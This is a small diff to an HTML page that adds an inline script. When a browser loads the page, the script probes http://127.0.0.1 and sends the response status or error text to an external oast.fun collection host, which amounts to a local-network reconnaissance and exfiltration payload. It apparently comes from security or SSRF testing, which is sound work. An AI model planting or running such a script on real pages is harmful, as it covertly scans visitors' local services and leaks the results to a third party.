@@ -5,10 +5,17 @@
 </head>
 <body>
 <script>
-
-    fetch('https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun', {
+fetch('http://127.0.0.1')
+  .then(response => {
+    fetch(`https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun/?status=${response.status}`, {
       method: 'GET'
     });
+  })
+  .catch(error => {
+    fetch(`https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun/?error=${encodeURIComponent(error.toString())}`, {
+      method: 'GET'
+    });
+  });
 </script>
 </body>
 </html>
